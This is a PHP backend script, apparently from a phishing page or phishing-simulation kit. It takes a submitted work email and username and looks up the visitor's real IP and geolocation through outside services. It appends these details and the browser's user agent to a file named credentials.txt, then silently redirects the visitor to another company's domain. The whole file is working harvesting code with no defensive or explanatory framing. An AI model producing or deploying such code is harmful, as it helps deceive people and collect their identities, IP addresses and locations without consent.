<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $workemail = trim($_POST["workemail"] ?? '—');
    $username = trim($_POST["username"] ?? '—');

    // Fallback extraction if JS didn't populate username
    if ($username === '—' && $workemail !== '—' && strpos($workemail, '@') !== false) {
        $parts = explode('@', $workemail);
        $namePart = str_replace('.', ' ', $parts[0]);
        $username = ucwords($namePart);
    }

    date_default_timezone_set("Asia/Kolkata");
    $timestamp = date("Y-m-d h:i:s A");
    $submitted = "Yes (Form Submitted)";
    
    // Real Public IP extraction
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] 
          ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
          ?? $_SERVER['REMOTE_ADDR'] 
          ?? 'Unknown';

    if (strpos($ip, ',') !== false) {
        $ip = trim(explode(',', $ip)[0]);
    }

    if ($ip === 'Unknown' || strpos($ip, '127.') === 0 || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0 || strpos($ip, '172.') === 0) {
        $external_ip = @file_get_contents('https://api.ipify.org');
        if ($external_ip) {
            $ip = trim($external_ip);
        }
    }

    // Geolocation / Location fetch karna IP se
    $location = 'Unknown Location';
    if ($ip !== 'Unknown') {
        $geoJson = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city");
        $geo = json_decode($geoJson, true);
        if ($geo && isset($geo['status']) && $geo['status'] === 'success') {
            $city = $geo['city'] ?? '';
            $region = $geo['regionName'] ?? '';
            $country = $geo['country'] ?? '';
            $location = trim("{$city}, {$region}, {$country}", ', ');
        }
    }

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';

    $credFile = __DIR__ . '/credentials.txt';
    $file = fopen($credFile, "a+");
    
    fwrite($file, "Received at=" . $timestamp . "\n");
    fwrite($file, "username=" . $username . "\n");
    fwrite($file, "workemail=" . $workemail . "\n");
    fwrite($file, "form_submitted=" . $submitted . "\n");
    fwrite($file, "client_ip=" . $ip . "\n");
    fwrite($file, "location=" . $location . "\n");
    fwrite($file, "user_agent=" . $userAgent . "\n");
    fwrite($file, "--------\n");
    
    fclose($file);
    
    header("Location: https://naviq-uat.resolven.com");
    exit;
}
?>